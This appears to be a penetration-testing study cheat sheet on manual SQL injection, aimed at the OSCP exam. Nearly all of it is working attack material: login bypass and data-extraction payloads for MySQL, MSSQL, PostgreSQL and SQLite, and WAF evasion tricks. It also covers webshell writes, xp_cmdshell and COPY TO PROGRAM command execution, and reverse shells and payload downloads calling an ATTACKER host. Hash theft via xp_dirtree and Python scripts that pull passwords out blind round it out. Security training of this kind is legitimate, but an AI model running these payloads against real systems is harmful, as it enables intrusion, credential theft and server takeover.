---
title: "SQL Injection"
date: 2026-06-20
weight: 40
draft: false
summary: "Manual SQL injection workflow without SQLmap, plus frequently used payloads."
---

The OSCP exam prohibits SQLmap, so perform all SQL injection manually.

- Source: https://heretek.dev/oscp-cheatsheet/sql-injection/ (Jean Romero) — reconstructed
- Variables: `$TARGET` = target host, `$ATTACKER` = attacker (Kali) IP (`ATTACKER_IP` in the body means the same thing)
- Placeholders such as `TARGET`, `IP`, `ATTACKER`, `ATTACKER_IP`, and `KALI` are literal stand-ins — replace them with real addresses before running.

## How it works

The app pastes user input straight into the SQL query. If you enter `offsec` in the login form:

```sql
SELECT username,password FROM users WHERE username='offsec' AND password='hashed_pass';
```

Adding one more quote, like `offsec'`, breaks the query and usually produces a DB error or a visibly different response. That is a sign that user input reaches the query.

If you enter `offsec' or 1=1;-- -`, the query changes to:

```sql
SELECT username,password FROM users WHERE username='offsec' or 1=1;-- -' AND password='hashed_pass';
```

`or 1=1` is always true, and `-- -` comments out the rest.

## Step 1 — Find the injection point

Use wfuzz to send known SQLi payloads and special characters into form fields:

```bash
wfuzz -c -z file,/usr/share/seclists/Fuzzing/SQLi/quick-SQLi.txt -d "username=FUZZ&password=bar" -u http://TARGET/login.php
wfuzz -c -z file,/usr/share/seclists/Fuzzing/special-chars.txt -d "username=FUZZ&password=bar" -u http://TARGET/login.php
wfuzz -c -z file,/usr/share/seclists/Fuzzing/SQLi/quick-SQLi.txt -d "username=FUZZ&password=bar" -u http://TARGET/login.php -p "127.0.0.1:8080:HTTP"
```

Manual testing in Burp Repeater:

```text
'
"
;
' or 1=1-- -
' or 1=1;-- -
```

What to look for in responses:

- DB error message → injection point confirmed; try error-based extraction
- Successful login or change in page content → the query result is visible; try UNION
- No visible change → test for blind SQLi

## Step 2 — Identify the DBMS

Determine it from the error message:

- `You have an error in your SQL syntax` → MySQL
- `Unclosed quotation mark... Microsoft SQL Server` → MSSQL
- `ERROR: syntax error at or near` → PostgreSQL

Comment syntax:

- MySQL: `-- -` or `#` — e.g., `' or 1=1-- -`
- MSSQL: `--` — e.g., `' or 1=1--`
- PostgreSQL: `--` — e.g., `' or 1=1--`

- MySQL requires a space after `--`. Using `-- -` is safe. MSSQL/PostgreSQL don't need an extra `-`.
- In URL-encoded bodies, a space becomes `+`, so `-- -` is sent as `--+-`. In Burp Repeater's raw view you can type the space directly.

## Step 3 — Choose an attack method

- Error-based: when error messages are shown on the page — fast
- UNION-based: when the app displays query results on the page — fast
- Stacked queries: run a second statement with `;` (verify with `WAITFOR`/`SLEEP`) — on MSSQL this can lead straight to RCE when `xp_cmdshell` is available
- Boolean blind: the page changes but no errors or data are visible — slow
- Time-based blind: no visible change at all — slowest

- If it's MSSQL (IIS + ASP.NET + SqlClient), check stacked queries first: `'; WAITFOR DELAY '0:0:5'--`. If it works, skip the rest and go straight to xp_cmdshell.

Before committing to one attack method, run the 7-test checklist below. It quickly shows which methods work and which are blocked.

## SQLi detection checklist (run all 7 tests before committing to an attack)

### Test 1 — Does the injection exist?

Enter `'` into the field. Does the app break, show an error, or behave differently?

- Error or different response → injectable; continue.
- No change → try `"`, `\`, `1 OR 1=1`, and `)`.
- If none of these change the response, injection is unlikely — still try the blind tests below before giving up.

### Test 2 — Authentication bypass

Can you log in? If yes, the injection works — record the payload before moving on.

### Test 3 — Error-based (check the response from Test 1)

Did the `'` test show a DB error message on the page? If so:

```text
MySQL:    ' AND extractvalue(1,concat(0x3a,version()))-- -
MSSQL:    ' AND 1=cast((SELECT DB_NAME()) AS int)--
Postgres: ' AND 1=cast((SELECT version()) AS int)--
```

If the returned error contains the version or DB name, error-based extraction works.

### Test 4 — UNION-based

```sql
' ORDER BY 1-- -
' ORDER BY 5-- -
' ORDER BY 10-- -
```

Find the column count and try UNION SELECT with placeholders. If ORDER BY works but UNION keeps failing, stop here and move on to Test 5.

### Test 5 — Stacked queries (important — especially MSSQL)

```text
MSSQL:  '; WAITFOR DELAY '0:0:5'--
MySQL:  '; SELECT SLEEP(5)-- -       (usually fails in PHP apps)
Postgres: '; SELECT pg_sleep(5)--
```

Did the response take 5 seconds longer? Stacked queries work. If it's MSSQL, skip data extraction and go straight to xp_cmdshell.

### Test 6 — Boolean blind

```text
' AND 1=1-- -     → page looks normal?
' AND 1=2-- -     → page looks different?
```

If the two pages look different, boolean blind works. Script it with Python.

### Test 7 — Time-based blind (last resort)

```text
MySQL:  ' AND IF(1=1,SLEEP(5),0)-- -
MSSQL:  '; IF(1=1) WAITFOR DELAY '0:0:5'--     (this IS stacked queries — same as Test 5)
Postgres: ' AND (SELECT CASE WHEN 1=1 THEN pg_sleep(5) ELSE pg_sleep(0) END)--
```

- MSSQL needs stacked queries for WAITFOR DELAY. If Test 5 succeeded, skip ahead to xp_cmdshell.

Summary:

- Auth bypass — just check whether login works — immediate
- Error-based — return data through error messages — fast
- UNION — return data in the page body — fast
- Stacked queries — execute separate statements (RCE on MSSQL) — immediate RCE
- Boolean blind — page change = true/false — slow (script it)
- Time-based blind — response delay = true/false — slowest (script it)

## Authentication bypass

Enter into the username field:

```sql
offsec' or 1=1;-- -
admin' or 1=1;-- -
' or 1=1;-- -
' or 1=1-- -
' or 1=1#
admin'-- -
') or ('1'='1'-- -
" or 1=1-- -
```

How it works:

```sql
SELECT * FROM users WHERE username='offsec' or 1=1;-- -' AND password='...'
--                                          ^^^^^^^^     ^^^^^^^^^^^^^^^^^^
--                                          always true  commented out
```

## Error-based SQLi

Start with a DBMS-specific error that leaks a value, then use the subsections below to extract data.

```text
MySQL:    ' AND extractvalue(1,concat(0x3a,database()))-- -
MSSQL:    ' AND 1=cast((SELECT DB_NAME()) AS int)--
Postgres: ' AND 1=cast((SELECT version()) AS int)--
```

### MySQL — extractvalue()

```sql
' AND extractvalue(1, concat(0x3a, database()))-- -
' AND extractvalue(1, concat(0x3a, (SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1)))-- -
' AND extractvalue(1, concat(0x3a, (SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 0,1)))-- -
' AND extractvalue(1, concat(0x3a, (SELECT concat(username,';',password) FROM users LIMIT 0,1)))-- -
```

`0x3a` is `:`. `LIMIT 0,1` is the first row, `LIMIT 1,1` is the second row.

- extractvalue() truncates after about 32 characters. Read long data in chunks with `SUBSTRING()`:

```sql
' AND extractvalue(1, concat(0x3a, SUBSTRING((SELECT password FROM users LIMIT 0,1), 1, 30)))-- -
' AND extractvalue(1, concat(0x3a, SUBSTRING((SELECT password FROM users LIMIT 0,1), 31, 30)))-- -
```

### MySQL — updatexml() (when extractvalue is blocked)

```sql
' AND updatexml(1, concat(0x3a, (SELECT version())), 1)-- -
' AND updatexml(1, concat(0x3a, (SELECT concat(username,';',password) FROM users LIMIT 0,1)), 1)-- -
```

### MSSQL — cast() / convert()

```sql
' AND 1=cast((SELECT @@version) AS int)--
' AND 1=cast((SELECT DB_NAME()) AS int)--
' AND 1=cast((SELECT TOP 1 name FROM sysdatabases) AS int)--
' AND 1=cast((SELECT TOP 1 name FROM sysobjects WHERE xtype='U') AS int)--
' AND 1=cast((SELECT TOP 1 username FROM users) AS int)--
' AND 1=cast((SELECT TOP 1 password FROM users) AS int)--
```

Next rows in MSSQL — there's no LIMIT, so use `NOT IN`:

```sql
' AND 1=cast((SELECT TOP 1 name FROM sysobjects WHERE xtype='U' AND name NOT IN ('users')) AS int)--
' AND 1=cast((SELECT TOP 1 username FROM users WHERE username NOT IN ('admin')) AS int)--
```

### PostgreSQL — cast()

```sql
' AND 1=cast((SELECT version()) AS int)--
' AND 1=cast((SELECT table_name FROM information_schema.tables WHERE table_schema='public' LIMIT 1) AS int)--
' AND 1=cast((SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 1) AS int)--
' AND 1=cast((SELECT username FROM users LIMIT 1) AS int)--
```

For the next row, add `OFFSET 1`, `OFFSET 2`, and so on.

## UNION-based SQLi

### Step 1 — Find the column count

```sql
' ORDER BY 1-- -
' ORDER BY 2-- -
' ORDER BY 6-- -          (ERROR → only 5 columns)
```

In Burp: `'+ORDER+BY+1--+-`.

### Step 2 — Find the columns visible on the page

```sql
' UNION SELECT 'A1','B2','C3','D4','D5'-- -
```

In Burp: `'+union+select+'A1','B2','C3','D4','D5'--+-`.

If you get a type error, use NULL: `' UNION SELECT NULL,'B2',NULL,NULL,NULL-- -`

### Step 3 — Extract data

MySQL:

```text
'+union+select+'A1',database(),'C3','D4','D5'--+-
'+union+select+'A1',table_name,'C3','D4','D5'+from+information_schema.tables+where+table_schema=database()--+-
'+union+select+'A1',column_name,'C3','D4','D5'+from+information_schema.columns+where+table_name='users'--+-
'+union+select+'A1',group_concat(username,'@@',password),'C3','D4','D5'+from+users--+-
```

If group_concat is truncated, go one row at a time:

```text
'+union+select+'A1',concat(username,'@@',password),'C3','D4','D5'+from+users+LIMIT+0,1--+-
'+union+select+'A1',concat(username,'@@',password),'C3','D4','D5'+from+users+LIMIT+1,1--+-
```

MSSQL:

```sql
' UNION SELECT NULL,@@version,NULL,NULL,NULL--
' UNION SELECT NULL,DB_NAME(),NULL,NULL,NULL--
' UNION SELECT NULL,name,NULL,NULL,NULL FROM master..sysdatabases--
' UNION SELECT NULL,name,NULL,NULL,NULL FROM sysobjects WHERE xtype='U'--
' UNION SELECT NULL,name,NULL,NULL,NULL FROM syscolumns WHERE id=(SELECT id FROM sysobjects WHERE name='users')--
' UNION SELECT NULL,username+':'+password,NULL,NULL,NULL FROM users--
```

One row at a time (MSSQL has no LIMIT):

```sql
' UNION SELECT TOP 1 NULL,username,NULL,NULL,NULL FROM users--
' UNION SELECT TOP 1 NULL,username,NULL,NULL,NULL FROM users WHERE username NOT IN ('admin')--
```

PostgreSQL:

```sql
' UNION SELECT NULL,table_name,NULL,NULL FROM information_schema.tables WHERE table_schema='public'--
' UNION SELECT NULL,column_name,NULL,NULL FROM information_schema.columns WHERE table_name='users'--
' UNION SELECT NULL,username||':'||password,NULL,NULL FROM users--
```

SQLite:

```sql
' UNION SELECT NULL,group_concat(tbl_name),NULL FROM sqlite_master WHERE type='table'--
' UNION SELECT NULL,sql,NULL FROM sqlite_master WHERE tbl_name='users'--
' UNION SELECT NULL,group_concat(username||':'||password,char(10)),NULL FROM users--
```

## information_schema cheat sheet

MySQL:

- All DBs: `SELECT schema_name FROM information_schema.schemata`
- Table count: `SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database()`
- Tables in the current DB: `SELECT table_name FROM information_schema.tables WHERE table_schema=database()`
- Columns: `SELECT column_name FROM information_schema.columns WHERE table_schema=database() AND table_name='users'`
- Dump data: `SELECT group_concat(username,';',password SEPARATOR '\n\n') FROM users`

PostgreSQL:

- All DBs: `SELECT datname FROM pg_database`
- Table count: `SELECT COUNT(*) FROM information_schema.tables WHERE table_schema='public'`
- Tables in the current schema: `SELECT table_name FROM information_schema.tables WHERE table_schema='public'`
- Columns: `SELECT column_name FROM information_schema.columns WHERE table_schema='public' AND table_name='users'`
- Dump data: `SELECT string_agg(username || ';' || password, chr(10)) FROM users`

MSSQL (system tables are different):

- All DBs: `SELECT name FROM master..sysdatabases`
- Table count: `SELECT COUNT(name) FROM sysobjects WHERE xtype='U'`
- Tables: `SELECT name FROM sysobjects WHERE xtype='U'`
- Columns: `SELECT name FROM syscolumns WHERE id=(SELECT id FROM sysobjects WHERE name='users')`

## SQLi → file read / webshell (MySQL)

File read:

```sql
' UNION SELECT NULL,LOAD_FILE('/etc/passwd'),NULL,NULL,NULL-- -
' UNION SELECT NULL,LOAD_FILE('C:/xampp/htdocs/wp-config.php'),NULL,NULL,NULL-- -
```

Webshell write:

```sql
' UNION SELECT NULL,'<?php system($_GET["cmd"]); ?>',NULL,NULL,NULL INTO OUTFILE '/var/www/html/shell.php'-- -
' UNION SELECT NULL,'<?php system($_GET["cmd"]); ?>',NULL,NULL,NULL INTO OUTFILE 'C:/xampp/htdocs/shell.php'-- -
```

Execute: `http://TARGET/shell.php?cmd=whoami`

- Failure conditions: the file already exists, FILE privilege is missing, or `secure_file_priv` restricts the path.

## Stacked Queries — MSSQL RCE (xp_cmdshell)

MSSQL can run multiple statements separated by `;`. MySQL/PHP setups usually reject stacked statements because the driver executes only one statement.

Detection: `'; WAITFOR DELAY '0:0:5'--` → a 5-second delay means stacked queries work.

Step 1 — enable xp_cmdshell:

```sql
'; EXEC sp_configure 'show advanced options',1; RECONFIGURE;--
'; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;--
```

Step 2 — run commands (output is not shown):

```sql
'; EXEC xp_cmdshell 'whoami';--
```

Verify with ping: `'; EXEC xp_cmdshell 'ping ATTACKER_IP';--`
Listener: `sudo tcpdump -i tun0 icmp`

Step 3 — reverse shell:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER LPORT=443 -f exe -o shell.exe
python3 -m http.server 80
```

```sql
'; EXEC xp_cmdshell 'certutil -urlcache -f http://ATTACKER/shell.exe C:\Windows\Temp\shell.exe';--
'; EXEC xp_cmdshell 'C:\Windows\Temp\shell.exe';--
```

If xp_cmdshell is refused — steal the hash:

```sql
'; EXEC master..xp_dirtree '\\ATTACKER_IP\share\';--
```

Catch it: `sudo responder -I tun0 -A` → crack with `hashcat -m 5600`

URL-encoding for Burp:

```text
';+EXEC+sp_configure+'show+advanced+options',1;+RECONFIGURE;--
';+EXEC+sp_configure+'xp_cmdshell',1;+RECONFIGURE;--
';+EXEC+xp_cmdshell+'whoami';--
';+EXEC+xp_cmdshell+'ping+ATTACKER_IP';--
```

## Stacked Queries — PostgreSQL RCE

```sql
'; COPY (SELECT '') TO PROGRAM 'whoami';--
'; COPY (SELECT '') TO PROGRAM 'bash -c "bash -i >& /dev/tcp/ATTACKER/4444 0>&1"';--
```

Requires the `superuser` role. Check with `\du` in psql.

## Blind SQLi — boolean-based

MySQL syntax is shown below. For MSSQL use `SUBSTRING(DB_NAME(),1,1)`; for PostgreSQL use `substring(current_database(),1,1)`.

Confirm: `offsec' or 1=1-- -` vs `offsec' or 1=2-- -` → do the pages differ?

Extract one character at a time:

```text
offsec' AND substring(database(),1,1)='a'-- -     → FALSE
offsec' AND substring(database(),1,1)='o'-- -     → TRUE
offsec' AND substring(database(),2,1)='f'-- -     → TRUE
offsec' AND (SELECT substring(password,1,1) FROM users LIMIT 1)='a'-- -
```

## Blind SQLi — time-based

```sql
-- MySQL
offsec' AND IF(1=1,SLEEP(2),0)-- -
offsec' AND IF(substring(database(),1,1)='o',SLEEP(2),0)-- -

-- MSSQL
offsec'; IF(1=1) WAITFOR DELAY '0:0:5'--
offsec'; IF(SUBSTRING(DB_NAME(),1,1)='m') WAITFOR DELAY '0:0:5'--

-- PostgreSQL
offsec'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--
```

## Blind SQLi — Python script (SQLmap is prohibited)

The two scripts below use MySQL syntax (`SUBSTRING`, `LIMIT`, `IF`, `SLEEP`). Swap the inner query and time function for the target DBMS using the payloads above.

Boolean-based extractor:

```text
#!/usr/bin/env python3
import requests, string

url = "http://TARGET/login.php"
true_indicator = "Welcome"   # must appear only in the TRUE response
charset = string.ascii_letters + string.digits + "!@#$%^&*()-_=+.,;:"
extracted = ""

for pos in range(1, 50):
    found = False
    for char in charset:
        payload = f"offsec' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),{pos},1))={ord(char)}-- -"
        data = {"username": payload, "password": "anything"}
        r = requests.post(url, data=data)
        if true_indicator in r.text:
            extracted += char
            print(f"[+] {pos}: {char}  =>  {extracted}")
            found = True
            break
    if not found:
        print(f"[*] Done: {extracted}")
        break
```

Time-based extractor:

```text
#!/usr/bin/env python3
import requests, string

url = "http://TARGET/login.php"
charset = string.ascii_letters + string.digits + "!@#$%^&*()-_=+.,;:"
extracted = ""

for pos in range(1, 50):
    found = False
    for char in charset:
        payload = f"offsec' AND IF(ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),{pos},1))={ord(char)},SLEEP(3),0)-- -"
        data = {"username": payload, "password": "anything"}
        try:
            r = requests.post(url, data=data, timeout=8)
            if r.elapsed.total_seconds() >= 2.5:
                extracted += char
                print(f"[+] {pos}: {char}  =>  {extracted}")
                found = True
                break
        except requests.exceptions.Timeout:
            extracted += char
            print(f"[+] {pos}: {char}  =>  {extracted}")
            found = True
            break
    if not found:
        print(f"[*] Done: {extracted}")
        break
```

Time payloads per DB:

- MySQL: `IF(condition,SLEEP(3),0)`
- MSSQL: `IF(condition) WAITFOR DELAY '0:0:3'`
- PostgreSQL: `SELECT CASE WHEN condition THEN pg_sleep(3) ELSE pg_sleep(0) END`

## Filter / WAF bypass

```text
-- Space blocked? Use comments
'+union+select+/**/NULL,version(),NULL--+-

-- UNION blocked? Case variation
'+uNiOn+sElEcT+'A1',database(),'C3'--+-

-- Quotes blocked? Use hex
... WHERE table_name=0x7573657273              (hex for 'users')

-- AND/OR blocked? URL-encode & as %26 in HTTP bodies
' && 1=1-- -
' || 1=1-- -

-- Double URL encoding (if WAF decodes once)
%2527+or+1%253d1--+-
```

## Quick reference links (documents in this folder)

- Full workflow → [methodology.md](methodology.md)
- Web attacks (directory brute forcing, CMS, LFI, uploads, etc.) → [web-attacks.md](web-attacks.md)
